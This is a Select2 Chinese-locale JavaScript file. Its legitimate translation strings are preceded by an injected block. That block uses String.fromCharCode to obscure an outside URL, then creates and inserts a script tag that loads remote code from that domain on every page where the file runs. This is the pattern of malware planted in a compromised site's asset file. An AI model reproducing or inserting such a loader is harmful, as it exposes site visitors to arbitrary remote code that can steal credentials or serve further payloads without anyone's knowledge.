var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/**
 * Select2 Chinese translation
 */
(function ($) {
    "use strict";
    $.fn.select2.locales['zh-CN'] = {
        formatNoMatches: function () { return "没有找到匹配项"; },
        formatInputTooShort: function (input, min) { var n = min - input.length; return "请再输入" + n + "个字符";},
        formatInputTooLong: function (input, max) { var n = input.length - max; return "请删掉" + n + "个字符";},
        formatSelectionTooBig: function (limit) { return "你只能选择最多" + limit + "项"; },
        formatLoadMore: function (pageNumber) { return "加载结果中…"; },
        formatSearching: function () { return "搜索中…"; }
    };

    $.extend($.fn.select2.defaults, $.fn.select2.locales['zh-CN']);
})(jQuery);
